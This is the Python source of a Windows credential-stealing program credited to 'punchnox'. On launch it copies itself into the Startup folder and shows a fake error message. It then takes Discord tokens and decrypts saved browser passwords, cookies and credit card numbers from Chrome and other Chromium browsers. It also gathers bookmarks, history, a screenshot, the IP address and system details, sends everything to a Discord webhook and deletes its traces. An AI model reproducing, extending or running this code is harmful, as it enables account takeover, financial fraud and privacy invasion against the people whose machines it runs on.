# coding: utf-8


#https://gist.githubusercontent.com/NotPunchnox/3f7572042cace6488d2492f6da47eec3/raw/1688ac7761e36ec851d506f88669483658dea3d7/sltcv

punchnox = "dev par punchnox"

import shutil, pyautogui, uuid, platform, os, requests, dhooks,  re, sys
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from json import loads as json_loads, load
from subprocess import Popen
from base64 import b64decode
from random import choice, randint
from string import ascii_lowercase
from datetime import datetime
from sqlite3 import connect as sql_connect
from Crypto.Cipher import AES
import browserhistory as bh
roaming = os.getenv('APPDATA')


def launch():
    filePath = shutil.copy(sys.argv[0], roaming + '\Microsoft\Windows\Start Menu\Programs\Startup')
launch()

ICON_STOP = 0x10
result = windll.user32.MessageBoxW(0, "Code : 5894 \nImpossible d'exécuter le programme sur votre système d'exploitation", "Error !", ICON_STOP)

hook = dhooks.Webhook(punchnox)

global uuidgen
uuidgen = str(uuid.uuid4())
ip = requests.get('https://api.ipify.org').text

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

temp = os.getenv("TEMP")


class DATA_BLOB(Structure):
 _fields_ = [
  ('cbData', wintypes.DWORD),
  ('pbData', POINTER(c_char))
 ]


def GetData(blob_out):
 cbData = int(blob_out.cbData)
 pbData = blob_out.pbData
 buffer = c_buffer(cbData)
 cdll.msvcrt.memcpy(buffer, pbData, cbData)
 windll.kernel32.LocalFree(pbData)
 return buffer.raw


def CryptUnprotectData(encrypted_bytes, entropy=b''):
 buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
 buffer_entropy = c_buffer(entropy, len(entropy))
 blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
 blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
 blob_out = DATA_BLOB()

 if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None,
  None, 0x01, byref(blob_out)):
  return GetData(blob_out)

LocalAppData = os.environ['LocalAppData'] + '\\'
AppData = os.environ['AppData'] + '\\'
FileName = 116444736000000000
NanoSeconds = 10000000


Popen('@chcp 65001 1>nul', shell=True)

def GetBrowsers():
 Browsers = []

 for Browser in BrowsersPath:
  if os.path.exists(Browser):
   Browsers.append(Browser)

 return Browsers

def DecryptPayload(cipher, payload):
 return cipher.decrypt(payload)

def GenerateCipher(aes_key, iv):
 return AES.new(aes_key, AES.MODE_GCM, iv)


def GetMasterKey(browserPath):
 fail = True

 for i in range(4):
  path = browserPath + '\\..' * i + '\\Local State'

  if os.path.exists(path):
   fail = False
   break

 if fail:
  return None

 with open(path, 'r', encoding='utf-8') as f:
  local_state = f.read()
  local_state = json_loads(local_state)

 master_key = b64decode(local_state['os_crypt']['encrypted_key'])
 master_key = master_key[5:]
 master_key = CryptUnprotectData(master_key)
 return master_key


def DecryptValue(buff, master_key=None):
 starts = buff.decode(encoding='utf8', errors='ignore')[:3]

 if starts == 'v10' or starts == 'v11':
  iv = buff[3:15]
  payload = buff[15:]
  cipher = GenerateCipher(master_key, iv)
  decrypted_pass = DecryptPayload(cipher, payload)
  decrypted_pass = decrypted_pass[:-16].decode()
  return decrypted_pass

 else:
  decrypted_pass = CryptUnprotectData(buff)
  return decrypted_pass

def FetchDataBase(target_db, sql=''):
 if not os.path.exists(target_db):
  return []

 tmpDB = os.getenv('TEMP') + 'info_' + ''.join(choice(ascii_lowercase) for i in range(randint(10, 20))) + '.db'
 shutil.copy2(target_db, tmpDB)
 conn = sql_connect(tmpDB)
 cursor = conn.cursor()
 cursor.execute(sql)
 data = cursor.fetchall()
 cursor.close()
 conn.close()

 try:
  os.remove(tmpDB)
 except:
  pass

 return data

def ConvertDate(ft):
 utc = datetime.utcfromtimestamp(((10 * int(ft)) - FileName) / NanoSeconds)
 return utc.strftime('%Y-%m-%d %H:%M:%S')

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

BrowsersPath = (
    local + '\\Google\\Chrome\\User Data\\Default',
    roaming + '\\Opera Software\\Opera Stable',
    local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    local + '\\Yandex\\YandexBrowser\\User Data\\Default',
    local + '\\7Star\\7Star\\User Data',
    local + '\\Amigo\\User Data',
    local + '\\CentBrowser\\User Data',
    local + '\\Google\\Chrome SxS\\User Data',
    local + '\\Epic Privacy Browser\\User Data',
    local + '\\Kometa\\User Data',
    local + '\\Orbitum\\User Data',
    local + '\\Sputnik\\Sputnik\\User Data',
    local + '\\Torch\\User Data',
    local + '\\uCozMedia\\Uran\\User Data',
    local + '\\Vivaldi\\User Data'
)




def main():

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Amigo': local + '\\Amigo\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        'Chrome Canary': local + '\\Google\\Chrome SxS\\User Data',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Uran': local + '\\uCozMedia\\Uran\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data',
    }

    message = ''

    for platform2, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform2}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    def GetPasswords():
      global credentials
      credentials = []
    
      for browser in GetBrowsers():
        master_key = GetMasterKey(browser)
        database = FetchDataBase(browser + '\\Login Data', 'SELECT action_url, username_value, password_value FROM logins')
    
        for row in database:
          password = {
            'hostname': row[0],
            'username': row[1],
            'password': DecryptValue(row[2], master_key)
          }
          credentials.append(password)
    
      return credentials

    def GetFormattedPasswords():
      getPasswords = GetPasswords()
      fmtPasswords = ''
    
      for password in getPasswords:
        fmtPasswords += ('Hostname: {0}\nUsername: {1}\nPassword: {2}\n=============================================\n'
        .format(password['hostname'], password['username'], password['password']))
    
      return fmtPasswords

    fichier2 = open(temp + "\\punchnox.txt", 'a')
    fichier2.write(GetFormattedPasswords())
    fichier2.close()

    def GetCookies():
        global credentials
        credentials = []
        
        for browser in GetBrowsers():
         master_key = GetMasterKey(browser)
         database = FetchDataBase(browser + '\\Cookies', 'SELECT * FROM cookies')
        
         for row in database:
          cookie = {
              'value': DecryptValue(row[12], master_key),
              'hostname': row[1],
              'name': row[2],
              'path': row[4],
              'expires': row[5],
              'secure': bool(row[6])
          }
          credentials.append(cookie)
        
        return credentials

    def GetFormattedCookies():
        getCookies = GetCookies()
        fmtCookies = ''
       
        for cookie in getCookies:
         fmtCookies += ('Value: {0}\nHost: {1}\nName: {2}\nPath: {3}\nExpire: {4}\nSecure: {5}\n\n'
         .format(cookie['value'], cookie['hostname'], cookie['name'], cookie['path'],  cookie['expires'], cookie['secure']))
       
        return fmtCookies

    fichier = open(temp + "\\cookies.txt", 'a')
    fichier.write(GetFormattedCookies())
    fichier.close()

    def GetBookmarks():
        global credentials
        credentials = []
    
        for browser in GetBrowsers():
         bookmarksFile = browser + '\\Bookmarks'
    
         if not os.path.exists(bookmarksFile):
          continue
         else:
          with open(bookmarksFile, 'r', encoding='utf8', errors='ignore') as file:
           bookmarks = load(file)['roots']['bookmark_bar']['children']
    
         for row in bookmarks:
          bookmark = {
              'hostname': row['url'],
              'name': row['name'],
              'date_added': ConvertDate(row['date_added'])
          }
    
          credentials.append(bookmark)
    
        return credentials

    def GetFormattedBookmarks():
        getBookmarks = GetBookmarks()
        fmtBookmarks = ''
        
        for bookmark in getBookmarks:
         fmtBookmarks += ('URL: {0}\nName: {1}\nDate: {2}\n\n'
         .format(bookmark['hostname'], bookmark['name'], bookmark['date_added']))
        
        return fmtBookmarks

    
    fichier = open(temp + "\\favori.txt", 'a')
    fichier.write(GetFormattedBookmarks())
    fichier.close()

    def GetCreditCards():
        global credentials
        credentials = []
        
        for browser in GetBrowsers():
         master_key = GetMasterKey(browser)
         database = FetchDataBase(browser + '\\Web Data', 'SELECT * FROM credit_cards')
        
         for row in database:
          if not row[4]:
           break
        
          card = {
              'number': DecryptValue(row[4], master_key),
              'expireYear': row[3],
              'expireMonth': row[2],
              'name': row[1],
          }
          credentials.append(card)
    
        return credentials

    def GetFormattedCreditCards():
     getCreditCards = GetCreditCards()
     fmtCreditCards = ''
     for card in getCreditCards:
      fmtCreditCards += ('Number: {4}\nName: {1}\nExpireYear: {3}\nExpireMonth: {2}\n\n'
      .format(card['number'], card['expireYear'], card['expireMonth'], card['name']))
      
      return fmtCreditCards

    dict_obj = bh.get_browserhistory()
    strobj = str(dict_obj).encode(errors='ignore')
    fichier58 = open(temp + "\\history.txt", 'a')
    fichier58.write(str(strobj))
    fichier58.close()

    hook.send("historique : ", file=dhooks.File(temp + "\\history.txt", name="history.txt"))
    hook.send("cookies : ", file=dhooks.File(temp + "\\cookies.txt", name="cookies.txt"))
    hook.send("password : ", file=dhooks.File(temp + "\\punchnox.txt", name="password.txt"))
    hook.send("Favori : ", file=dhooks.File(temp + "\\favori.txt", name="favori.txt"))
    os.system("del " + temp + "\\history.txt")
    os.system("del " + temp + "\\cookies.txt")
    os.system("del " + temp + "\\punchnox.txt")
    os.system("del " + temp + "\\favori.txt")
    if GetFormattedCreditCards():
        cartes = GetFormattedCreditCards()

    else:
        cartes = "Pas de cartes de crédits trouvées"
        
    hook.send("```\n" + cartes + "\n```")
    screenshot = pyautogui.screenshot()
    screenshot.save(temp + "\\screen.png")

    hook.send(file=dhooks.File(temp + '\\screen.png', name="screen.png"))
    os.system("del " + temp + "\\screen.png")

    hook.send(message)
    hook.send("```fix\nNouvelle connexion ouverte " + uuidgen + "\nPrefix : " + platform.node() + "\nSystème d'exploitation : " + platform.system() + " " + platform.release() + "\nArch : " + platform.architecture()[0]  + "\nNode : " + platform.node() + "\nProcesseur : " + platform.processor() + "\nIp : " + ip + "\nNom de la session : " + os.getlogin() + "\n```\n>>> ***Dev by punchnox***")
main()
